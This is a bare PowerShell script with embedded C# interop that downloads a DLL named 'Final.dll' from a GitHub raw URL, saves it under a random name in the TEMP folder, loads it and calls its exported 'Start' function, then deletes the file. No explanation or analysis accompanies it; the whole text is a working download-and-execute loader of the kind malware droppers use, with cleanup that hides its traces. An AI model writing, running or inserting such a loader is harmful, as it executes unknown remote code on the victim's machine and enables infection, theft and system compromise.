$code = @'
using System;
using System.Runtime.InteropServices;
public class Win {
    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string s);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr h, string s);
    [DllImport("kernel32.dll")]
    public static extern bool FreeLibrary(IntPtr h);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate void Start();
}
'@

Add-Type -TypeDefinition $code

$tmp = "$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).dll"
$w = New-Object Net.WebClient
$d = $w.DownloadData("https://github.com/angelsegg/gfddhd/raw/refs/heads/main/Final.dll")
$w.Dispose()
[IO.File]::WriteAllBytes($tmp, $d)
$h = [Win]::LoadLibrary($tmp)
if ($h -ne [IntPtr]::Zero) {
    $p = [Win]::GetProcAddress($h, "Start")
    if ($p -ne [IntPtr]::Zero) {
        $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Win+Start])
        $del.Invoke()
    }
    [Win]::FreeLibrary($h)
}
Start-Sleep 3
try { [IO.File]::Delete($tmp) } catch {}
